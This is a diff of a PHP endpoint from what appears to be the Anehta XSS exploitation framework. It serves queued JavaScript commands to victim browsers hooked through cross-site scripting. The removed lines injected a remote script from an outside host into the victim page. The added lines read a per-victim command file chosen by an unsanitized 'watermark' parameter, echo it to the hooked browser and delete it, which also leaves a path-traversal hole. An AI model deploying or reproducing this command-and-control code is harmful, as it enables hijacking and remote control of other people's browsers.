@@ -1,10 +1,19 @@
 <?php
 //$cmd = getenv('QUERY_STRING');  // XSS传回的数据
 //header('Content-Type: application/javascript');
+$watermarknum = $_GET['watermark'];
 
-$cmd = "var timesig = new Date();anehta.inject.injectScript('http://www.secwiki.com/anehta/module/test.js?'+timesig);";
-$cmd .= "//$('script').eq(2).removeAttr('src');//alert(2);";
-$cmd .= "alert(\$d.getElementsByTagName('script')[2].src);";
+if ($watermarknum == "null"){
+	$watermarknum = "noWatermark";
+}
 
-echo $cmd;
+if (file_exists("slave\\$watermarknum\\realtimecmd.txt")){
+    $cmd = file_get_contents("slave\\$watermarknum\\realtimecmd.txt"); 
+    unlink("slave\\$watermarknum\\realtimecmd.txt");
+    
+    echo $cmd;
+} else {
+	  echo "";
+}
+
 ?>
